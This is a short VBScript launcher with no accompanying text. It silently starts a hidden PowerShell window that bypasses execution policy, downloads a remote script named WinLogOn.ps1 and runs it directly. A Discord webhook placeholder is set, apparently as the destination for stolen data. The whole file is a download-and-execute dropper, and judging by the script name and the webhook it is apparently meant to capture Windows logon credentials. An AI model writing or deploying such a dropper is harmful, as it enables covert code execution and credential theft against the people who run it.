Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc = 'DISCORD_WEBHOOK_HERE';irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/WinLogOn.ps1 | iex", 0, True



